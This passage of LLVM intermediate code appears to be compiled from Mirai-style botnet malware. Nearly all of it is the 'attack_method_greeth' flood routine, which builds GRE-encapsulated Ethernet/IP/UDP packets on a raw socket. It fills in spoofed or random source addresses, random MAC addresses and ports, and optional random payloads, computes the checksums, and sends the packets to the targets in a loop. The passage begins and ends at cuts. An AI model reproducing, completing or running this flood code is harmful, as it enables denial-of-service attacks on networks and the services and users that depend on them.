  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 0
  %425 = bitcast %struct.sockaddr_in* %424 to %struct.sockaddr*
  store %struct.sockaddr* %425, %struct.sockaddr** %419, align 8
  %426 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %427 = load %struct.sockaddr*, %struct.sockaddr** %426, align 8
  %428 = call i64 @sendto(i32 noundef %414, i8* noundef %415, i64 noundef %418, i32 noundef 16384, %struct.sockaddr* %427, i32 noundef 16)
  br label %429

429:                                              ; preds = %362
  %430 = load i32, i32* %9, align 4
  %431 = add nsw i32 %430, 1
  store i32 %431, i32* %9, align 4
  br label %243, !llvm.loop !14

432:                                              ; preds = %243
  br label %242

433:                                              ; preds = %84, %78
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #1

declare i32 @close(i32 noundef) #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #2

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #2

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_greeth(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 noundef %42, i64 noundef 8) #7
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 noundef zeroext %45, %struct.attack_option* noundef %46, i8 noundef zeroext 2, i32 noundef 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 noundef zeroext %49, %struct.attack_option* noundef %50, i8 noundef zeroext 3, i32 noundef 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 noundef zeroext %53, %struct.attack_option* noundef %54, i8 noundef zeroext 4, i32 noundef 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 noundef zeroext %57, %struct.attack_option* noundef %58, i8 noundef zeroext 5, i32 noundef 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 noundef zeroext %61, %struct.attack_option* noundef %62, i8 noundef zeroext 6, i32 noundef 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 noundef zeroext %65, %struct.attack_option* noundef %66, i8 noundef zeroext 7, i32 noundef 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 noundef zeroext %69, %struct.attack_option* noundef %70, i8 noundef zeroext 0, i32 noundef 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 1, i32 noundef 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 19, i32 noundef 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 25, i32 noundef %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

86:                                               ; preds = %4
  br label %472

87:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 noundef %88, i32 noundef 0, i32 noundef 3, i8* noundef %89, i32 noundef 4) #7
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

92:                                               ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 noundef %93)
  br label %472

95:                                               ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

96:                                               ; preds = %252, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %255

101:                                              ; preds = %96
  %102 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 8) #7
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = and i8 %127, 15
  %129 = or i8 %128, 64
  store i8 %129, i8* %126, align 4
  %130 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, -16
  %134 = or i8 %133, 5
  store i8 %134, i8* %131, align 4
  %135 = load i8, i8* %12, align 1
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 1
  store i8 %135, i8* %137, align 1
  %138 = load i32, i32* %18, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 66, %139
  %141 = trunc i64 %140 to i16
  %142 = call zeroext i16 @htons(i16 noundef zeroext %141) #8
  %143 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 2
  store i16 %142, i16* %144, align 2
  %145 = load i16, i16* %13, align 2
  %146 = call zeroext i16 @htons(i16 noundef zeroext %145) #8
  %147 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 3
  store i16 %146, i16* %148, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 5
  store i8 %149, i8* %151, align 4
  %152 = load i8, i8* %15, align 1
  %153 = icmp ne i8 %152, 0
  br i1 %153, label %154, label %158

154:                                              ; preds = %101
  %155 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %156 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 4
  store i16 %155, i16* %157, align 2
  br label %158

158:                                              ; preds = %154, %101
  %159 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 6
  store i8 47, i8* %160, align 1
  %161 = load i32, i32* %21, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 8
  store i32 %161, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 1
  %169 = load i32, i32* %168, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 9
  store i32 %169, i32* %171, align 4
  %172 = call zeroext i16 @htons(i16 noundef zeroext 25944) #8
  %173 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %174 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %173, i32 0, i32 1
  store i16 %172, i16* %174, align 2
  %175 = call zeroext i16 @htons(i16 noundef zeroext 2048) #8
  %176 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %177 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %176, i32 0, i32 2
  store i16 %175, i16* %177, align 1
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, 15
  %182 = or i8 %181, 64
  store i8 %182, i8* %179, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = and i8 %185, -16
  %187 = or i8 %186, 5
  store i8 %187, i8* %184, align 4
  %188 = load i8, i8* %12, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 1
  store i8 %188, i8* %190, align 1
  %191 = load i32, i32* %18, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 28, %192
  %194 = trunc i64 %193 to i16
  %195 = call zeroext i16 @htons(i16 noundef zeroext %194) #8
  %196 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 2
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %13, align 2
  %199 = zext i16 %198 to i32
  %200 = xor i32 %199, -1
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 noundef zeroext %201) #8
  %203 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %14, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %15, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

210:                                              ; preds = %158
  %211 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

214:                                              ; preds = %210, %158
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 17, i8* %216, align 1
  %217 = call i32 @rand_next()
  %218 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load i8, i8* %20, align 1
  %221 = icmp ne i8 %220, 0
  br i1 %221, label %222, label %228

222:                                              ; preds = %214
  %223 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  br label %236

228:                                              ; preds = %214
  %229 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 8
  %231 = load i32, i32* %230, align 4
  %232 = sub i32 %231, 1024
  %233 = xor i32 %232, -1
  %234 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  br label %236

236:                                              ; preds = %228, %222
  %237 = load i16, i16* %16, align 2
  %238 = call zeroext i16 @htons(i16 noundef zeroext %237) #8
  %239 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  store i16 %238, i16* %240, align 2
  %241 = load i16, i16* %17, align 2
  %242 = call zeroext i16 @htons(i16 noundef zeroext %241) #8
  %243 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  %245 = load i32, i32* %18, align 4
  %246 = sext i32 %245 to i64
  %247 = add i64 8, %246
  %248 = trunc i64 %247 to i16
  %249 = call zeroext i16 @htons(i16 noundef zeroext %248) #8
  %250 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  store i16 %249, i16* %251, align 2
  br label %252

252:                                              ; preds = %236
  %253 = load i32, i32* %9, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %9, align 4
  br label %96, !llvm.loop !15

255:                                              ; preds = %96
  br label %256

256:                                              ; preds = %471, %255
  store i32 0, i32* %9, align 4
  br label %257

257:                                              ; preds = %468, %256
  %258 = load i32, i32* %9, align 4
  %259 = load i8, i8* %5, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp slt i32 %258, %260
  br i1 %261, label %262, label %471

262:                                              ; preds = %257
  %263 = load i8**, i8*** %11, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i8*, i8** %263, i64 %265
  %267 = load i8*, i8** %266, align 8
  store i8* %267, i8** %30, align 8
  %268 = load i8*, i8** %30, align 8
  %269 = bitcast i8* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %31, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.grehdr*
  store %struct.grehdr* %272, %struct.grehdr** %32, align 8
  %273 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %274 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %273, i64 1
  %275 = bitcast %struct.grehdr* %274 to %struct.ethhdr*
  store %struct.ethhdr* %275, %struct.ethhdr** %33, align 8
  %276 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %277 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %276, i64 1
  %278 = bitcast %struct.ethhdr* %277 to %struct.iphdr*
  store %struct.iphdr* %278, %struct.iphdr** %34, align 8
  %279 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i64 1
  %281 = bitcast %struct.iphdr* %280 to %struct.udphdr*
  store %struct.udphdr* %281, %struct.udphdr** %35, align 8
  %282 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i64 1
  %284 = bitcast %struct.udphdr* %283 to i8*
  store i8* %284, i8** %36, align 8
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = icmp slt i32 %291, 32
  br i1 %292, label %293, label %314

293:                                              ; preds = %262
  %294 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %297, i32 0, i32 1
  %299 = load i32, i32* %298, align 4
  %300 = call i32 @ntohl(i32 noundef %299) #8
  %301 = call i32 @rand_next()
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 2
  %307 = load i8, i8* %306, align 4
  %308 = zext i8 %307 to i32
  %309 = lshr i32 %301, %308
  %310 = add i32 %300, %309
  %311 = call i32 @htonl(i32 noundef %310) #8
  %312 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 9
  store i32 %311, i32* %313, align 4
  br label %314

314:                                              ; preds = %293, %262
  %315 = load i32, i32* %21, align 4
  %316 = icmp eq i32 %315, -1
  br i1 %316, label %317, label %321

317:                                              ; preds = %314
  %318 = call i32 @rand_next()
  %319 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 8
  store i32 %318, i32* %320, align 4
  br label %321

321:                                              ; preds = %317, %314
  %322 = load i16, i16* %13, align 2
  %323 = zext i16 %322 to i32
  %324 = icmp eq i32 %323, 65535
  br i1 %324, label %325, label %340

325:                                              ; preds = %321
  %326 = call i32 @rand_next()
  %327 = and i32 %326, 65535
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  %331 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  %333 = load i16, i16* %332, align 4
  %334 = zext i16 %333 to i32
  %335 = sub nsw i32 %334, 1000
  %336 = xor i32 %335, -1
  %337 = trunc i32 %336 to i16
  %338 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i32 0, i32 3
  store i16 %337, i16* %339, align 4
  br label %340

340:                                              ; preds = %325, %321
  %341 = load i16, i16* %16, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  br i1 %343, label %344, label %350

344:                                              ; preds = %340
  %345 = call i32 @rand_next()
  %346 = and i32 %345, 65535
  %347 = trunc i32 %346 to i16
  %348 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 0
  store i16 %347, i16* %349, align 2
  br label %350

350:                                              ; preds = %344, %340
  %351 = load i16, i16* %17, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  br i1 %353, label %354, label %360

354:                                              ; preds = %350
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %359 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %358, i32 0, i32 1
  store i16 %357, i16* %359, align 2
  br label %360

360:                                              ; preds = %354, %350
  %361 = load i8, i8* %20, align 1
  %362 = icmp ne i8 %361, 0
  br i1 %362, label %367, label %363

363:                                              ; preds = %360
  %364 = call i32 @rand_next()
  %365 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 9
  store i32 %364, i32* %366, align 4
  br label %373

367:                                              ; preds = %360
  %368 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 9
  %370 = load i32, i32* %369, align 4
  %371 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 9
  store i32 %370, i32* %372, align 4
  br label %373

373:                                              ; preds = %367, %363
  %374 = call i32 @rand_next()
  store i32 %374, i32* %37, align 4
  %375 = call i32 @rand_next()
  store i32 %375, i32* %38, align 4
  %376 = call i32 @rand_next()
  store i32 %376, i32* %39, align 4
  %377 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %378 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %377, i32 0, i32 0
  %379 = getelementptr inbounds [6 x i8], [6 x i8]* %378, i64 0, i64 0
  %380 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* noundef %379, i8* noundef %380, i32 noundef 4)
  %381 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %382 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %381, i32 0, i32 1
  %383 = getelementptr inbounds [6 x i8], [6 x i8]* %382, i64 0, i64 0
  %384 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* noundef %383, i8* noundef %384, i32 noundef 4)
  %385 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %386 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %385, i32 0, i32 0
  %387 = getelementptr inbounds [6 x i8], [6 x i8]* %386, i64 0, i64 0
  %388 = getelementptr inbounds i8, i8* %387, i64 4
  %389 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* noundef %388, i8* noundef %389, i32 noundef 2)
  %390 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %391 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %390, i32 0, i32 1
  %392 = getelementptr inbounds [6 x i8], [6 x i8]* %391, i64 0, i64 0
  %393 = getelementptr inbounds i8, i8* %392, i64 4
  %394 = bitcast i32* %39 to i8*
  %395 = getelementptr inbounds i8, i8* %394, i64 2
  call void @util_memcpy(i8* noundef %393, i8* noundef %395, i32 noundef 2)
  %396 = load i8, i8* %19, align 1
  %397 = icmp ne i8 %396, 0
  br i1 %397, label %398, label %401

398:                                              ; preds = %373
  %399 = load i8*, i8** %36, align 8
  %400 = load i32, i32* %18, align 4
  call void @rand_str(i8* noundef %399, i32 noundef %400)
  br label %401

401:                                              ; preds = %398, %373
  %402 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* noundef %405, i32 noundef 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* noundef %412, i32 noundef 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 3
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %419 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %420 = bitcast %struct.udphdr* %419 to i8*
  %421 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %422 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %421, i32 0, i32 2
  %423 = load i16, i16* %422, align 2
  %424 = load i32, i32* %18, align 4
  %425 = sext i32 %424 to i64
  %426 = add i64 8, %425
  %427 = trunc i64 %426 to i32
  %428 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %418, i8* noundef %420, i16 noundef zeroext %423, i32 noundef %427)
  %429 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %430 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %429, i32 0, i32 3
  store i16 %428, i16* %430, align 2
  %431 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %432 = load i32, i32* %9, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 0
  %436 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %435, i32 0, i32 0
  store i16 2, i16* %436, align 4
  %437 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 9
  %439 = load i32, i32* %438, align 4
  %440 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %441 = load i32, i32* %9, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i32 0, i32 0
  %445 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %444, i32 0, i32 2
  %446 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %445, i32 0, i32 0
  store i32 %439, i32* %446, align 4
